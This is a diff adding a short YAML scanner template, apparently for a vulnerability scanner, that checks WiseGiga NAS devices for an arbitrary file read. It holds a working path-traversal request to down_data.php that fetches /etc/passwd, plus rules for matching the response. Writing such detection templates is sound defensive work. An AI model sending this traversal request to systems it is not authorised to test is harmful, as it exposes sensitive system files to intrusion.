@@ -1,0 +1,24 @@
+id: wisegiga-nas-lfi
+brief:
+    title: WiseGiga NAS - Arbitrary File Read
+    by: pussycat0x
+    level: high
+    about: WISEGIGA NAS down_data.php has an arbitrary file download vulnerability. Due to the lax filtering of the filename parameter on the /down_data.php page, sensitive system files can be read.
+    label:
+        - wisegiga
+        - lfi
+        - nas
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - file/unknown
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
